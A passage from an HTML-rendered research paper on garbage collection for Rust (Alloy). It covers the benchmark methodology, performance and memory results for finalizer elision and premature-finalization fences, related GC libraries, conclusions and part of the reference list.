memory allocation types, the benchmarks we could run from them allocated sufficiently little memory
that there are no worthwhile differences between different allocation strategies. Put another way: these
programs are in a sense 'the same' from our evaluation perspective.
</p>

<p>
Two programs (bevy and rust-analyzer) did not run correctly after porting. Both extensively use the
<code>make_mut</code> or <code>get_mut</code> functions in <code>Rc&lt;T&gt;</code> and reverting those changes made the benchmarks
uninteresting.
</p>

<p>
We also ported RustPython, but were unable to adjust it to faithfully implement Python-level
destructors. In essence, in RustPython's default configuration, its representation of objects is
not compatible with FSA. This means that we can not run Python <code>__del__</code> methods in the
finalizer thread. Although technically this is still compatible with Python's semantics, we
felt this would be a misleading comparison, as our port of RustPython would be doing less
work.
</p>


<p><span>8.1.3    </span> <a id="x1-250008.1.3"></a>Running the Experiment</p>

<p>Our experiment can be seen as a comparison of <span>Alloy</span> against 'normal' Rust. Fortunately, <span>Alloy</span> is a
strict superset of 'normal' Rust: only if users explicitly opt into GC does <span>Alloy</span> really become a 'GC
for Rust'. This allows us to use the same compiler, standard library, and so on, removing
several potential confounding factor in our results. We compile two binaries: one without
logging features compiled and one with. We only use the latter when reporting collector related
metrics.
</p>

<p>
A challenge in our experiment is that different allocation strategies can use different underlying
allocators. In particular, <span>Alloy</span> has to use <span>BDWGC</span>, but, for example, <code>Rc&lt;T&gt;</code> can use a modern allocator
such as jemalloc. Much has changed in the performance of allocators since <span>BDWGC</span>'s 1980s roots: in
<code>Rc&lt;T&gt;</code>-only benchmarks, we observe an inherent overhead from <span>BDWGC</span> of 2–26% relative to jemalloc
(see Table 6 in the Appendix), which is a significant, and variable, confounding factor. Fortunately,
<span>BDWGC</span> can be used as a 'traditional' allocator that allocates and frees on demand (i.e. no
conservative GC occurs): in the main experiment, we thus use <span>BDWGC</span> as the allocator for all
benchmarks.
</p>

<p>
We want to understand the memory usage of different allocation strategies over the lifetime of a
benchmark. However, there is no single metric which captures 'memory usage', nor even an agreed set of
metrics [<a href="#Xdacapo25">5</a>]. We use two metrics to capture different facets: (1) <em>heap footprint</em>, the
amount of live heap memory recorded by by Heaptrack [<a href="#Xwolff14heaptrack">34</a>] at every allocation and deallocation; and (2)
<em>Resident Set Size</em> (RSS), the total physical memory in RAM used by the process (including
memory-mapped files, stack, and code/text segments), sampled at 10Hz. The overhead of recording
heap footprint is much greater than RSS, but it provides a more detailed view of memory
usage.
</p>

<p>
Another pair of confounding factors are the initial and maximum sizes of the GC heap: too-small
values can lead to frequent resizing and/or 'thrashing'; large values to unrealistically few collections.
What 'small' and 'large' are varies by benchmark, and 'careful' (or thoughtless) choices can significantly
distort one's view of performance. <span>BDWGC</span> uses an adaptive strategy by default, growing the
heap size as it detects that it would benefit from doing so. To give some sense of whether a
different strategy and/or heap size would make a difference, we ran our benchmarks with
three different fixed heap sizes. Doing so either has little effect or speeds benchmarks up;
when it does so, the impact is generally under 10% and is at most 28% (the detailed results
are presented in Table 9 in the Appendix). Broadly speaking, this suggests that <span>BDWGC</span>'s
default heap sizing approach, at least in our context, is not significantly distorting our view of
performance.
</p>

<p>
We ran each benchmark in our suite 30 times. We report wall-clock times as returned by the
standard Unix <code>time</code> utility. The SOM benchmarks are run using its conventional <em>rebench</em>
tool; we adjusted <em>rebench</em> to use <code>time</code> for consistency with our other benchmarks. We ran
all benchmarks on an AMD EPYC 7773X 64-Core 3.5GHz CPU with 128GiB RAM, running
Debian 12 ('bookworm'). We turned off turbo boost and hyper-threading, as both can colour
results.
</p>

<p><span>8.1.4    </span> <a id="x1-260008.1.4"></a>Data Presentation</p>

<p>Except where otherwise stated, we report means and 99% confidence intervals for all metrics. We
use the arithmetic mean for individual benchmarks and the geometric mean for benchmark
suites.
</p>

<p>
When plotting time-series (i.e. sampled) memory metrics, we face the challenge that different
configurations of the same benchmark can execute at different speeds. We thus resample each
benchmark's data to 1000 evenly spaced points using linear interpolation. We chose 1000 samples
because it is considerably above the visual resolution of our plots. After normalization, we calculate the
arithmetic mean of the memory footprint measurement at each grid point (and not the raw underlying
data) across all runs of the same benchmark. We record 99% confidence intervals at each point and show
the result as shaded regions around the mean.
</p>

<figure>
<img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/gcvs_perf.svg" alt="performance comparison chart">
<a id="x1-27001r1"></a>

<figcaption><span>Figure 1.  </span><span>comparing the effects of <code>gc&lt;t&gt;</code> and <code>rc&lt;t&gt;</code> on wall-clock time; heap footprint (i.e. the size of the
live set); and rss. the baseline at 1 is <code>rc&lt;t&gt;</code>; values less than 1 show <code>gc&lt;t&gt;</code> as better than <code>rc&lt;t&gt;</code>; and the blue
vertical line shows the geometric mean of ratios. the wall-clock times of <code>gc&lt;t&gt;</code> and <code>rc&lt;t&gt;</code> are similar; the rss
somewhat similar; and the average heap footprint often very different. broadly speaking, <code>gc&lt;t&gt;</code> increases the
average heap footprint because gc, and especially finalization, causes values to live for longer. benchmarks
which allocate relatively little memory (particularly <span>ripgrep</span> as shown in table <a href="#x1-23002r3">3</a>) can exaggerate this effect.
perhaps surprisingly, the heap footprint and rss do not correlate. this is partly because the sample rate for
rss is rather low (which notably affects fast running benchmarks such as those for <span>fd</span>) and partly because
rss necessarily includes headroom, that is memory beyond that needed for the live set (and which may later
be returned to the os).</span></figcaption>
</figure>

<p><span>8.2    </span> <a id="x1-270008.2"></a>Results</p>

<p>
The main results for <span>E<sub>GCvs</sub></span> can be seen in Fig. <a href="#x1-27001r1">1</a>. Though there is variation, <span>Alloy</span> has an overhead
on wall-clock time of 5% on our benchmark suite. The effect on memory is more variable though,
unsurprisingly, <span>Alloy</span> typically has a larger average heap footprint (i.e. allocated memory lives for
longer). This metric needs to treated with slight caution: benchmarks which allocate relatively small
amounts of memory (see Table <a href="#x1-23002r3">3</a>) can make the relative effect of average heap footprint seem much
worse than it is in absolute terms.
</p>

<p>
<span>Binary Trees</span> is sufficiently simple that we also used it to compare against <code>Arena&lt;T&gt;</code> and <span>Rust-GC</span>.
The time-series data in Fig. <a href="#x1-27002r2">2</a> is particularly illuminating (for completeness, Table 5 in the Appendix has
the raw timings). <span>Alloy</span> is around 3.5× slower than <code>Arena&lt;T&gt;</code>. The time-series data for the latter shows it
going through distinct phases: a (relatively long) allocation phase, a (relatively moderate) 'work' phase,
and a (relatively short) deallocation phase. Put another way: these clear phases make <span>Binary Trees</span> a
perfect match for an arena. In the other approaches, the 'work' phase occupies a much greater proportion
of their execution, because it also incorporates allocator work. <span>Alloy</span> is around 1.3× faster than <code>Rc&lt;T&gt;</code>,
but both have similar memory profiles. <span>Alloy</span> is around 3× faster than <span>Rust-GC</span> and has an
average heap footprint around 4× smaller, reflecting <span>Alloy</span>'s advantage in not being a user-land
library that relies in part on <code>Rc&lt;T&gt;</code>. Although we caution against over-interpreting a single
benchmark, this does give us at least some idea of the performance ceiling and floor for different
approaches.
</p>

<figure>
<img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/time_series.svg" alt="Time-series comparison chart">
<a id="x1-27002r2"></a>

<figcaption><span>Figure 2.  </span><span>A selection of time-series data with various GC approaches, showing normalised time on the <em>x</em>-axis
and heap footprint (with 99% confidence intervals shaded) on the <em>y</em>-axis. (i.e. the amount of live memory)
over time. <span>Binary Trees</span> shows an example of <span>Alloy</span> having a comparable heap footprint to <code>Rc&lt;T&gt;</code>; <span>Rust-GC</span>'s
heap footprint is around 4× greater. <span>Binary Trees</span> is a perfect fit to <code>Arena&lt;T&gt;</code>: it frees memory in one batch at
the end, and because it is 3× faster than <span>Alloy</span>, this 'wind down' period is a substantial portion of the overall
(quick!) execution. <span>Ripgrep</span> Alternates may seem to be an example of a memory leak in <span>Alloy</span>, but it is really
the result of the inevitable delay that GC imposes on noticing that values are lived, which is exacerbated by
the presence of finalizers. The frequent plateaus and dips show that memory is being freed, but at a later
point than one might initially expect. In contrast, <span>som-rs-bc</span> JSON Small shows a real memory leak due to
cyclic objects in <code>Rc&lt;T&gt;</code>, where <span>Alloy</span>'s heap footprint remains steady.
</span></figcaption>
</figure>

<p>
The time-series data in Fig. <a href="#x1-27002r2">2</a> helps explain other factors. For example, it shows that <span>som-rs-bc</span> leaks
memory on the JSON Small benchmark (we suspect it also leaks in some other benchmarks, though
rarely as visibly). This is because <code>Rc&lt;T&gt;</code> keeps alive values in cycles; <span>Alloy</span> does not leak memory on
<span>som-rs-bc</span>, as it naturally deals correctly with cycles.
</p>

<p>
We can see from the time-series data that <span>Ripgrep</span> has a complex heap footprint pattern.
This may suggest a memory leak, but in fact it is a consequence of the inevitable delay in
freeing memory in a GC. In general, GC notices that memory is unused later than reference
counting, but this is exacerbated further by finalizers. Surprisingly, finalizers can lengthen or
shorten an allocation's lifetime. GCed values with finalizers tend to have longer lifetimes,
because they have to wait in the finalizer queue. However, when a finalizer calls <code>free</code> on
indirectly owned values, those are immediately marked as not live, rather than having to
wait until the next collection to be discovered as such. This, albeit indirectly, explains the
seemingly random peaks and troughs in memory usage one can observe in <span>Ripgrep</span>'s time-series
data.
</p>

<figure>
<img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/elision_metrics.svg" alt="Finalizer elision effects chart">
<a id="x1-27003r3"></a>

<figcaption><span>Figure 3.  </span><span>The  effects  of  finalizer  elision  on  various  metrics.  The  top-left  chart  shows  the  proportion  of
run-time <code>Gc&lt;T&gt;</code> values that: have had their finalizers elided; cannot have their finalizers elided; have no
finalizers to elide. This chart is best read in conjunction in Table <a href="#x1-23002r3">3</a> to (a) get a sense of the quantity of
run-time memory involved (b) how much indirectly owned memory the <code>Gc&lt;T&gt;</code> values have. The other plots
use 'no finalizer elision' as the normalization base (i.e. values below 1 show that finalizer elision improves a
metric). Total GC pause time is the cumulative time spent in stop-the-world collections. User time captures
the time spent in all threads, including the finalizer thread. Broadly speaking, the more finalizers are elided,
and the greater the proportion of the overall heap the memory owned by <code>Gc&lt;T&gt;</code>, the better the metrics
become.</span></figcaption>
</figure>

<p>
The results of <span>E<sub>Elision</sub></span> are shown in Fig. <a href="#x1-27003r3">3</a>. In general, there is a fairly clear correlation: the more
finalizers are removed, and the greater the proportion of the overall heap the memory owned by <code>Gc&lt;T&gt;</code> is,
the better the metrics become. However, there are several caveats. First, when all finalizers are removed,
<span>BDWGC</span> does not start a finalizer thread or invoke locking related to it, unduly flattering the time-based
metrics. Second, the quantity of finalizers is only a partial proxy for cost: some finalizers free
up large graphs of indirectly owned values, which can take some time to run. Third, some
benchmarks change the work they do: <span>grmtools</span> speeds up so much that its error recovery
algorithm has time to do more work, so while finalizer hugely benefits its GC pause time,
its wall-clock time changes much less. Finally, since finalizers can cause indirectly owned
allocations to be freed earlier than the GC itself does naturally, removing them can cause
indirectly owned values to live for longer: <span>Ripgrep</span>'s average heap footprint highlights this
issue.
</p>

<p>
The results for <span>E<sub>PremOpt</sub></span> are shown in Fig. <a href="#x1-28001r4">4</a>. We created three configurations of <span>Alloy</span>. <em>None</em> has no
fences, and thus is unsound, but allows us to approximate (allowing for possible vagaries from running
unsound code!) the best possible outcome. <em>Naive</em> inserts all possible fences. <em>Optimised</em> inserts only
necessary fences. Once confidence intervals are taken into account, there are no statistically
significant results for this experiment. Although it is possible that benchmarking 'noise' is hiding a
meaningful result, our data suggests that any such differences are likely to be minimal. To
make up for this disappointment, the fact that there is no difference between any of these
suggests that, on non-artificial benchmarks, premature finalizer prevention is not a noticeable
cost.
</p>

<figure>
<img src="https://soft-dev.org/pubs/html/hughes_tratt__garbage_collection_for_rust_the_finalizer_frontier/images/premopt_perf.svg" alt="Premature finalization optimization chart">
<a id="x1-28001r4"></a>

<figcaption><span>Figure 4.  </span><span>The effect of premature finalization optimisation, normalised to <em>None</em> (i.e. no fences). Grey bars
represent  the  ratio  for  <em>naive</em>  (all  possible  fences)  and  blue  bars  <em>optimised</em>  (obviously  unnecessary  fences
removed). Unfortunately, this attempted optimisation has no statistically significant effects.</span></figcaption>
</figure>

<p>
Any performance judgements we make are necessarily contingent on our methodology the benchmark
suite we chose, including the proportion of benchmarks that we ported, and the way we process and
present data. For example, we did not port external libraries to use <code>Gc&lt;T&gt;</code> so many benchmarks use a
variety of allocation strategies. Even had we ported everything, we would not be able to say, for example,
that finalizer elision will always improve performance by exactly the factor we see in our experiment:
there undoubtedly exist reasonable, non-pathological, programs which will see performance changes
outside the ranges that our results suggest.
</p>

<p>
Using <span>BDWGC</span> as the allocator for all benchmarks has the advantage of removing 'pure' allocator
performance as a confounding factor, but does mean that some of the performance characteristics of
benchmarks will be changed (e.g due to the portion of time we spend in the allocator; or <span>BDWGC</span>'s
adaptive heap sizing strategy). A generic, modern conservative GC, using the insights of recent non-GC
allocators, would almost certainly give different – though we suspect not profoundly different
– results. To the best of our knowledge there is currently no production-quality modern,
generic conservative, GC we could use instead, though we are aware of at least one attempt to
create such an alternative: it will be interesting to rerun our experiments if and when that
arrives.
</p>

<p>
The RSS memory metric we collect is at Linux's whim: if it does not update as frequently
as we expect, we will see artificially 'smoothed' data that may miss out peaks and troughs.
Similar, our interpolation of time-series data onto a normalised grid can also smooth data. We
manually checked a large quantity of data to ensure this was not a significant effect; by running
benchmarks 30 times means it is also less more likely that peaks and troughs are caught at least
sometimes.
</p>

<h3><span>10    </span> <a id="x1-2900010"></a>Related Work</h3>

<p>In this paper we hope to have given sufficient background on GC and the use of destructors and finalizers
in general. In this section we mostly survey the major parts of the GC for Rust landscape more widely.
Our survey is inevitably incomplete, in part because this is a rapidly evolving field (a number of changes
have occurred since the most recent equivalent survey we are aware of [<a href="#Xmanish21arena">16</a>]). We also cover some
relevant non-Rust GC work not mentioned elsewhere.
</p>

<p>
Early versions of Rust had 'managed pointers' (using the <code>@T</code> syntax) which were intended to
represent GC types [<a href="#Xmanish21arena">16</a>]. The core implementation used reference counting though there
were several, sometimes short-lived, cycle detectors [<a href="#Xhoare22cycles">17</a>]. Managed pointer support was
removed<span><a href="#fn9x0"><sup>9</sup></a></span><a id="x1-29001f9"></a> 
around a year before the first stable release of Rust. This was not the end of the story for
'GC as a core part of Rust', with core Rust developers exploring the problem space in more
detail [<a href="#Xmanish16gc">15</a>, <a href="#Xfelix15specifying">21</a>, <a href="#Xfelix16roots">22</a>]. Over time these efforts dwindled, and those interested in GC for Rust largely
moved from anticipating <code>rustc</code> support to expecting to have to do everything in user-level
libraries.
</p>

<p>
One of the earliest user-level GC for Rust libraries is <span>Bacon-Rajan-CC</span> [<a href="#Xrustbacon">12</a>]. This provides a type <code>Cc&lt;T&gt;</code>
which is similar in intention to <span>Alloy</span>'s <code>Gc&lt;T&gt;</code>. The mechanism by which objects are collected is rather
different: they have a naive reference count, which causes objects outside a cycle to have deterministic
destruction; and users can manually invoke a cycle detector, which uses trial deletion in the style of Bacon and
Rajan [<a href="#Xbacon01concurrent">4</a>]<span><a href="#fn10x0"><sup>10</sup></a></span><a id="x1-29003f10"></a> 
to identify objects in unused cycles. Cycle detection requires users manually implementing a <code>Trace</code> trait
which traverses a type's fields. Destructors are used as finalizers: to avoid the problems with Rust
references we solved in Section <a href="#x1-160007.1">7.1</a>, <span>Bacon-Rajan-CC</span> imposes a <code>T:'static</code> lifetime bound on the type
parameter passed to <code>Cc&lt;T&gt;</code>. Simplifying slightly, this means that any references in such a type must be
valid for the remaining lifetime of the program, a severe restriction. Unlike our approach to the access of
already-finalized values (Section <a href="#x1-170007.2">7.2</a>), it can only detect such accesses at runtime, leading to a (safe) Rust
<code>panic</code>.
</p>

<p>
Probably the best known GC for Rust is <span>Rust-GC</span> [<a href="#Xmanish15rustgc">14</a>] (partly covered in Section <a href="#x1-80004">4</a>). <span>Rust-GC</span>'s <code>Gc&lt;T&gt;</code>
provides a similar API to <span>Alloy</span>, with the notable exception that its <code>Gc&lt;T&gt;</code> is not, and cannot be, copyable,
thus always requiring calls to <code>Gc::clone</code>. Although, like <span>Alloy</span>, <span>Rust-GC</span> allows <code>Gc&lt;T&gt;</code> values to be
converted into pointers, its lack of conservative GC means that users must ensure that a <code>Gc&lt;T&gt;</code> wrapper
is kept alive for the entire lifetime of pointers derived from it. Similarly to <span>Bacon-Rajan-CC</span>,
GCed values are reference counted, with occasional tracing sweeps to identify cycles, though
<span>Rust-GC</span> performs cycle detection automatically (i.e. it doesn't require manual calls to a
function such as <code>collect_cycles</code>). Drop methods are not used as finalizers: if a finalizer is
required, a manual implementation of the <code>Finalize</code> trait must be provided; finalizer glue can be
largely, though not fully (see Section <a href="#x1-80004">4</a>), automatically created by the provided <code>Trace</code> macro.
<span>Rust-GC</span> detects accesses to already-finalized values dynamically at run-time, panicking
if they occur. Unlike <span>Bacon-Rajan-CC</span>, these accesses are detected by recording what the
collector's state is in: if the collector is in a 'sweep' phase, any access of a <code>Gc&lt;T&gt;</code> leads to a
panic. We have not yet verified whether cross-thread collection / sweeping can evade this
check.
</p>

<p>
An example of moving beyond reference counting in a GC for Rust is <span>Shifgrethor</span> [<a href="#Xshifgrethor">2</a>]. It requires <code>Gc</code>
values to be created by a <code>Root&lt;'root&gt;</code>: the resulting <code>Gc&lt;'root, T&gt;</code> is then tied to the lifetime of the
<code>Root&lt;'root&gt;</code>. This allows roots to be precisely identified, but requires explicitly having access to a
<code>Root&lt;'root&gt;</code> whenever a <code>Gc&lt;'root, T&gt;</code> is used. As with <span>Rust-GC</span>, <span>Shifgrethor</span> requires users to
manually implement a <code>Finalize</code> trait, though <span>Shifgrethor</span>'s is more restrictive: not only can other
GCed values not be accessed (implicitly solving the same problem as Section <a href="#x1-170007.2">7.2</a>) but any other
type without the same <code>'root</code> lifetime as the GCed value is forbidden. This means that many
seemingly safe finalizers require implementing the unsafe <code>UnsafeFinalize</code> trait. We view
<span>Shifgrethor</span> as proof that accurately tracking GC roots in normal Rust without reference
counting is possible, though it cannot deal with references being converted into pointers and
<code>usize</code>s.
</p>

<p>
A different means of tackling the root-finding problem is <span>GcArena</span> [<a href="#Xgcarena">32</a>], which uses branding in a
similar way to <code>GhostCell</code>s (see Section <a href="#x1-20002">2</a>). In essence, users provide a special 'root' type which is the
only place where roots can be stored. Mutating the heap can only be done in the context
of functions that are passed a branded reference to the GCed heap. Once such a function
has completed, <span>GcArena</span> is in full control of the GC heap, and knows that only the root
type needs to be scanned for roots. This leads to a precise guarantee about GC reference
lifetimes. However, if code executes in an arena for too long, the system can find itself starved of
resources, with no way of recovering, even if much of the arena is no longer used. <span>GcArena</span>
was originally part of the <em>Piccolo</em> VM (which was itself previously called <em>Luster</em>), a Lua VM
written in Rust. Such VMs have a frequently executed main loop which is a natural point for a
program to relinquish references to the GCed heap, but this is not true of many other GCed
programs.
</p>

<p>
One attempt to improve upon <span>Rust-GC</span> is <span>Bronze</span> 
[<a href="#Xcoblenz21bronze">11</a>], though it shows how challenging it can be to meaningfully improve GC for
Rust: both of its main advances have subsequently been disabled because they are not just unsound but
actively lead to crashes. First, <span>Bronze</span> tried to solve the root-finding problem by using LLVM's <code>gc.root</code>
intrinsic at function entries to generate stack-maps (a run-time mechanism for accurately tracking active
pointers). This rules out the false positives that are inevitable in conservative GC. However, <span>Bronze</span>
could not track nested references: if a <code>Gc&lt;T&gt;</code> was used as a field in a struct, it was not tracked
by the GC. Second, <span>Bronze</span> tried to give GC in Rust similar semantics to non-ownership
languages such as Java. It did this by allowing shared mutation, undermining Rust's borrow
checker.
</p>

<p>
Chrome's rendering engine <em>Blink</em> uses the conservative GC <span>Oilpan</span>. It has the interesting
property that it has two classes of finalizers. 'Full finalizers' are similar to finalizers in <span>Alloy</span>,
running on a finalizer thread at an indeterminate future point, but with the difference that they
can only reference parts of a GCed value. To mitigate this, 'pre-finalizers' are run by the
collector on the same thread as mutator as soon as an object as recognised as unused, and can
access all of a GCed value. Pre-finalizers are necessary, but not encouraged, because they
implicitly pause the stop-the-world phase of the collector. This reflects the fact that latency is a
fundamental concern for a rendering engine: <span>Alloy</span> currently makes no pretences to being low
latency.
</p>

<h3><span>11    </span> <a id="x1-3000011"></a>Conclusions</h3>

<p>We introduced a novel design for GC in Rust that solves a number of outstanding challenges in GC for
Rust, as well as – by taking advantage of Rust's unusual static guarantees – some classical GC finalizer
problems. By making integration with existing Rust code easier than previous GCs for Rust, we hope to
have shown a pragmatic route for partial or wholesale migration of Rust code that would benefit from
GC.
</p>

<p>
Challenges and future opportunities remain. For example, <span>Alloy</span> is an 'all or nothing' cost: if you
want to use <code>Gc&lt;T&gt;</code> in a single location, you must pay the costs of the GC runtime and so
on. <span>Alloy</span>'s absolute speed is, we believe, limited by <span>BDWGC</span>: it is probable that using a
semi-precise GC and/or a faster conservative GC could change our view of the absolute performance
speed
</p>

<p>
In summary, we do not claim that <span>Alloy</span> is the ultimate design for GC in Rust – reasonable people
may, for example, disagree on whether the costs of conservative GC are worth the gains –
but it does show what can be achieved if one is willing to alter the language's design and
<code>rustc</code>.
</p>

<h3>Data Availability Statement</h3>
<p>
The accompanying artefact [<a href="#Xhughes25garbageartefact">18</a>] contains: the source code necessary to run this paper's experiment
(including generating figures etc.) from scratch; and data from a run of the experiment that we used in
this paper.
</p>

<h3>Acknowledgments<a id="likesection.2"></a><a id="x1-30001x11"></a><a id="Q1-1-44"></a></h3>
<p>
This work was funded by an EPSRC PhD studentship and the Shopify / Royal
Academy of Engineering Research Chair in Language Engineering. We thank Steve Klabnik and Andy
Wingo for comments.
</p>

    <h3><a id="likesection.3"></a><a id="x1-30002x11"></a><a id="Q1-1-44"></a>References</h3>

<ol>
  <li id="Xager13oilpan">
    <span>[1]</span>
    Mads Ager, Erik Corry, Vyacheslav Egorov, Kentaro Hara, Gustav Wibling, and Ian Zerny. 2013. Oilpan: tracing garbage collection for Blink. <a href="https://docs.google.com/document/d/1y7_0ni0E_kxvrah-QtnreMlzCDKN3QP4BN1Aw7eSLfY">https://docs.google.com/document/d/1y7_0ni0E_kxvrah-QtnreMlzCDKN3QP4BN1Aw7eSLfY</a>. Accessed on 2024-10-15.
  </li>

  <li id="Xshifgrethor">
    <span>[2]</span>
    Saoirse Aronson. 2018. shifgrethor. <a href="https://github.com/withoutboats/shifgrethor/">https://github.com/withoutboats/shifgrethor/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xbacon04unified">
    <span>[3]</span>
    David F Bacon, Perry Cheng, and VT Rajan. 2004. A unified theory of garbage collection. In <em>OOPSLA</em>. 50–68.
  </li>

  <li id="Xbacon01concurrent">
    <span>[4]</span>
    David F Bacon and Vadakkedathu T Rajan. 2001. Concurrent cycle collection in reference counted systems. In <em>ECOOP</em>. 207–235. <a href="https://doi.org/10.1007/3-540-45337-7_12">doi:10.1007/3-540-45337-7_12</a>
  </li>

  <li id="Xdacapo25">
    <span>[5]</span>
    Stephen M. Blackburn, Zixian Cai, Rui Chen, Xi Yang, John Zhang, and John Zigman. 2025. Rethinking Java Performance Analysis. In <em>ASPLOS</em>. 940–954. <a href="https://doi.org/10.1145/3669940.3707217">doi:10.1145/3669940.3707217</a>
  </li>

  <li id="Xboehm03destructors">
    <span>[6]</span>
    Hans-J Boehm. 2003. Destructors, finalizers, and synchronization. In <em>POPL</em>. <a href="https://doi.org/10.1145/604131.604153">doi:10.1145/604131.604153</a>
  </li>

  <li id="Xboehm07optimization">
    <span>[7]</span>
    Hans-J Boehm and Mike Spertus. 2007. Optimization-robust finalization. <a href="https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007/n2261.html">https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007/n2261.html</a>. Accessed: 2024-08-08.
  </li>

  <li id="Xboehm09garbage">
    <span>[8]</span>
    Hans-J Boehm and Mike Spertus. 2009. Garbage collection in the next C++ standard. In <em>ISMM</em>. 30–38. <a href="https://doi.org/10.1145/1542431.1542437">doi:10.1145/1542431.1542437</a>
  </li>

  <li id="Xboehm88garbage">
    <span>[9]</span>
    Hans-Juergen Boehm and Mark Weiser. 1988. Garbage collection in an uncooperative environment. <em>SPE</em> 18, 9 (Sept. 1988), 807–820. <a href="https://doi.org/10.1002/spe.4380180902">doi:10.1002/spe.4380180902</a>
  </li>

  <li id="Xchiovoloni15typed">
    <span>[10]</span>
    Thom Chiovoloni. 2015. Typed Arena. <a href="https://github.com/thomcc/rust-typed-arena/">https://github.com/thomcc/rust-typed-arena/</a>. Accessed: 2025-03-25.
  </li>

  <li id="Xcoblenz21bronze">
    <span>[11]</span>
    Michael Coblenz, Michelle Mazurek, and Michael Hicks. 2022. Does the Bronze Garbage Collector Make Rust Easier to Use? A Controlled Experiment. In <em>ICSE</em>. <a href="https://doi.org/10.1145/3510003.3510107">doi:10.1145/3510003.3510107</a>
  </li>

  <li id="Xrustbacon">
    <span>[12]</span>
    Nick Fitzgerald. 2015. bacon-rajan-cc: A reference counted type with cycle collection for Rust. <a href="https://github.com/fitzgen/bacon-rajan-cc">https://github.com/fitzgen/bacon-rajan-cc</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xgoetz21deprecated">
    <span>[13]</span>
    Brian Goetz and Mikael Vidstedt. 2021. JEP 421: Deprecate Finalization for Removal. <a href="https://openjdk.org/jeps/421">https://openjdk.org/jeps/421</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xmanish15rustgc">
    <span>[14]</span>
    Manish Goregaokar. 2015. rust-gc. <a href="https://github.com/Manishearth/rust-gc/">https://github.com/Manishearth/rust-gc/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xmanish16gc">
    <span>[15]</span>
    Manish Goregaokar. 2016. GC support in Rust: API design. <a href="https://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design/">https://manishearth.github.io/blog/2016/08/18/gc-support-in-rust-api-design/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xmanish21arena">
    <span>[16]</span>
    Manish Goregaokar. 2021. A tour of safe tracing GC designs in Rust. <a href="https://manishearth.github.io/blog/2021/03/15/arenas-in-rust/">https://manishearth.github.io/blog/2021/03/15/arenas-in-rust/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xhoare22cycles">
    <span>[17]</span>
    Graydon Hoare. 2022. Reply to 'What should be included in a history of the Rust language?'. <a href="https://www.reddit.com/r/rust/comments/za5lh5/comment/iyp0ptm/">https://www.reddit.com/r/rust/comments/za5lh5/comment/iyp0ptm/</a>.
  </li>

  <li id="Xhughes25garbageartefact">
    <span>[18]</span>
    Jacob Hughes and Laurence Tratt. 2025. Reproduction Package for Article 'Garbage Collection for Rust: The Finalizer Frontier'. Zenodo. <a href="https://doi.org/10.5281/zenodo.17013382">doi:10.5281/zenodo.17013382</a>
  </li>

  <li id="Xjones23garbage">
    <span>[19]</span>
    Richard Jones, Antony Hosking, and Eliot Moss. 2023. <em>The Garbage Collection Handbook: the Art of Automatic Memory Management</em> (second ed.). Chapman and Hall/CRC. <a href="https://doi.org/10.1201/9781003276142">doi:10.1201/9781003276142</a>
  </li>

  <li id="Xklabnik18rust">
    <span>[20]</span>
    Steve Klabnik and Carol Nichols. 2018. <em>The Rust Programming Language</em>. No Starch Press. <a href="https://doi.org/10.5555/3271463">doi:10.5555/3271463</a>
  </li>

  <li id="Xfelix15specifying">
    <span>[21]</span>
    Felix S. Klock. 2015. GC and Rust: specifying the problem. <a href="http://blog.pnkfx.org/blog/2015/11/10/gc-and-rust-part-1-specing-the-problem/">http://blog.pnkfx.org/blog/2015/11/10/gc-and-rust-part-1-specing-the-problem/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xfelix16roots">
    <span>[22]</span>
    Felix S. Klock. 2016. GC and Rust: The roots of the problem. <a href="http://blog.pnkfx.org/blog/2016/01/01/gc-and-rust-part-2-roots-of-the-problem/">http://blog.pnkfx.org/blog/2016/01/01/gc-and-rust-part-2-roots-of-the-problem/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xllvm14statepoints">
    <span>[23]</span>
    LLVM. 2014. Garbage collection with LLVM. <a href="https://llvm.org/docs/GarbageCollection.html">https://llvm.org/docs/GarbageCollection.html</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xniko13destructors">
    <span>[24]</span>
    Niko Matsakis. 2013. Destructors and finalizers in Rust. <a href="http://smallcultfollowing.com/babysteps/blog/2013/01/17/destructors-and-finalizers-in-rust/">http://smallcultfollowing.com/babysteps/blog/2013/01/17/destructors-and-finalizers-in-rust/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xpierce04advanced">
    <span>[25]</span>
    Benjamin C Pierce. 2004. <em>Advanced topics in Types and Programming Languages</em>. MIT press. <a href="https://doi.org/10.7551/mitpress/1104.001.0001">doi:10.7551/mitpress/1104.001.0001</a>
  </li>

  <li id="Xpizlo17riptide">
    <span>[26]</span>
    Filip Pizlo. 2017. Introducing Riptide: WebKit's retreating wavefront concurrent garbage collector. <a href="https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/">https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/</a>. Accessed: 2024-10-15.
  </li>

  <li id="Xrustlangref">
    <span>[27]</span>
    Rust. 2014. The Rust language reference. <a href="https://doc.rust-lang.org/reference/">https://doc.rust-lang.org/reference/</a>. Accessed: 2024-10-01.
  </li>

  <li id="Xshahriyar14fast">
    <span>[28]</span>
    Rifat Shahriyar, Stephen M. Blackburn, and Kathryn S. McKinley. 2014. Fast conservative garbage collection. In <em>OOPSLA</em>. 121–139. <a href="https://doi.org/10.1145/2660193.2660198">doi:10.1145/2660193.2660198</a>
  </li>

  <li id="Xshipilev20local">
    <span>[29]</span>
    Alekesy Shpilëv. 2020. JVM Anatomy Quark #8: Local Variable Reachability. <a href="https://shipilev.net/jvm/anatomy-quarks/8-local-var-reachability/">https://shipilev.net/jvm/anatomy-quarks/8-local-var-reachability/</a>. Accessed: 2024-10-08.
  </li>

